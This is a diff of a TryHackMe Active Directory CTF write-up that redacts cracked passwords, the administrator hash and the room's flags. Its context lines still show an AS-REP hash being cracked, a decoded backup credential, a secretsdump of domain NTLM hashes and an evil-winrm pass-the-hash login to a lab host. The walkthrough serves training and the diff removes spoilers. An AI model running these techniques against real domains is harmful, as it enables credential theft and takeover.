@@ -383,8 +383,8 @@ Dictionary cache built:
 * Keyspace..: 70188
 * Runtime...: 0 secs
 
-$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:1ba18f806be0710fdabbf679bc10271c$4daed3c14bddd9e1dbd71473aedad8169e26d52b4d07b7c4999c88e9cf1b51a5b7e4ee625b21fd3363a4f938622ec09b9968bc71e66d92f995fd150067ba1575fb869b37c28e5d21b5ce107788c35506d38b9bc0e64f90677a51b6739dccdc62bc6290fa873e0fda697ae3e13ed13de984bb10cacf3d924a90bdc55e7ff77c1cc094a578009c5fbcf47d2b6df4cfebaa0cde31c9923db2eb1b944dde00bf654ef564370a8cbcb835e0b890d30bbb7738711b5e09b238567dfa345454cb3ef71235fed93c8471a97e0d66b3452fe029875d311790986e62fedfa574d69417eb7d0f6f5e8b27ac5d2c4cd8fb51c253c2fd7ad1:management2005
-                                                 
+$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:1ba18f806be0710fdabbf679bc10271c$4daed3c14bddd9e1dbd71473aedad8169e26d52b4d07b7c4999c88e9cf1b51a5b7e4ee625b21fd3363a4f938622ec09b9968bc71e66d92f995fd150067ba1575fb869b37c28e5d21b5ce107788c35506d38b9bc0e64f90677a51b6739dccdc62bc6290fa873e0fda697ae3e13ed13de984bb10cacf3d924a90bdc55e7ff77c1cc094a578009c5fbcf47d2b6df4cfebaa0cde31c9923db2eb1b944dde00bf654ef564370a8cbcb835e0b890d30bbb7738711b5e09b238567dfa345454cb3ef71235fed93c8471a97e0d66b3452fe029875d311790986e62fedfa574d69417eb7d0f6f5e8b27ac5d2c4cd8fb51c253c2fd7ad1:<HIDDEN>
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Kerberos 5, etype 23, AS-REP
@@ -414,7 +414,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-management2005   ($krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL)
+<HIDDEN>   ($krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL)
 1g 0:00:00:00 DONE (2021-03-23 22:19) 33.33g/s 221866p/s 221866c/s 221866C/s horoscope..amy123
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
@@ -464,7 +464,7 @@ In there we see some loot, let's grab it:
 
 ┌──(root💀kali)-[~/thm/attacktive]
 └─# cat 10.10.85.191-backup__credentials.txt 
-YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+<HIDDEN>
 ```
 
 We have a string which looks to be base64 encoded, let's decode it:
@@ -472,7 +472,7 @@ We have a string which looks to be base64 encoded, let's decode it:
 ```text
 ┌──(root💀kali)-[~/thm/attacktive]
 └─# base64 --decode 10.10.85.191-backup__credentials.txt
-backup@spookysec.local:backup2517860
+<HIDDEN>
 ```
 
 Victory! We've now got credentials of another account.
@@ -488,7 +488,7 @@ Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corpo
 Password:
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HIDDEN>:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
 spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
@@ -640,7 +640,7 @@ Now that's installed we can use what we've retrieved so far to connect as the ad
 
 ```text
 ┌──(root💀kali)-[~/thm/attacktive/evil-winrm]
-└─# evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.85.191
+└─# evil-winrm -u administrator -H <HIDDEN> -i 10.10.85.191
 Evil-WinRM shell v2.4
 Info: Establishing connection to remote endpoint
 
@@ -661,7 +661,7 @@ Mode                LastWriteTime         Length Name
 -a----         4/4/2020  11:39 AM             32 root.txt
 
 *Evil-WinRM* PS C:\Users\Administrator\desktop> more root.txt
-TryHackMe{4ctiveD1rectoryM4st3r}
+TryHackMe{HIDDEN}
 ```
 
 ```text
@@ -674,7 +674,7 @@ Mode                LastWriteTime         Length Name
 -a----         4/4/2020  12:19 PM             26 PrivEsc.txt
 
 *Evil-WinRM* PS C:\Users\backup\desktop> more privesc.txt
-TryHackMe{B4ckM3UpSc0tty!}
+TryHackMe{HIDDEN}
 ```
 
 ```text
@@ -687,5 +687,5 @@ Mode                LastWriteTime         Length Name
 -a----         4/4/2020  12:18 PM             28 user.txt.txt
 
 *Evil-WinRM* PS C:\Users\svc-admin\desktop> more user.txt.txt
-TryHackMe{K3rb3r0s_Pr3_4uth}
+TryHackMe{HIDDEN}
 ```
